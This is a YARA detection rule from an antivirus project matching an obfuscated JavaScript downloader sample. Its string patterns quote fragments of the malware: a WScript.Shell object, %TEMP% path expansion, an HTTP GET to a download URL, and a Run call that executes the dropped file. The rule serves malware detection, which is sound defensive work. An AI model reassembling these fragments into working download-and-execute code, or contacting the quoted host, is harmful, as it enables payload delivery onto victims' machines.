rule sig_20160427_4f64ec1d85239f729c18b78aa9da46ff {
  meta:
    description = "datamaliciousorder - file 20160427_4f64ec1d85239f729c18b78aa9da46ff.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "479732e964aa412960284684346a85099e2459f6afd79a653c736d60d6b8e0af"

  strings:
    $s1  = "function DhzwjOhjou() {return MjfunPalcd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"s7NZbBn" ascii
    $s2  = "function DhzwjOhjou() {return MjfunPalcd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"s7NZbBn" ascii
    $s3  = "var MjfunPalcd = function PscseHyysv() {return KyhehQhbhj[CuxvaCtooi](\"WScript\"+\".Shell\");}(), VnnqzYfyip = 11;" fullword ascii
    $s4  = "function HnhpaWdlff(AimksZpqpb, QbklqVzygt){KlntvGrgdr = KlntvGrgdr * 1; return AimksZpqpb - QbklqVzygt;};" fullword ascii
    $s5  = "VvqffWhuga[JageqRmtef](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var KyhehQhbhj = this[\"WScript\"];" fullword ascii
    $s7  = "function SsbeqXopja(){return AwxgsKoeem + \"\";};" fullword ascii
    $s8  = "if (VvqffWhuga[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function ClmfeUlgcf() {return ((ZfhndUicrj == true) && (ZfhndUicrj == SajwjIjeoy)) ? 1 : KlntvGrgdr;};" fullword ascii
    $s10 = "}while (HkdlxVxnuo);" fullword ascii
    $s11 = "return HnhpaWdlff(RqwsqLhnby, YrgavMadmv);" fullword ascii
    $s12 = "function LraysJlfoe(CiudvKdirf){MjfunPalcd[\"R\"+\"un\"](CiudvKdirf, KlntvGrgdr, KlntvGrgdr);};" fullword ascii
    $s13 = "function HzlfqPhewv(XvtyxYzzdi) {var PebnnUhihj = (1, 2, 3, 4, 5, XvtyxYzzdi); return PebnnUhihj;};" fullword ascii
    $s14 = "function QzivtUrclr()" fullword ascii
    $s15 = "function RacicOtsvv(){return CuxvaCtooi;};" fullword ascii
    $s16 = "var DshqwSdgpk = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "SajwjIjeoy = true; " fullword ascii
    $s18 = "var PqqucLkqiv = false;" fullword ascii
    $s19 = "var ZfhndUicrj = false;" fullword ascii
    $s20 = "PqqucLkqiv = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}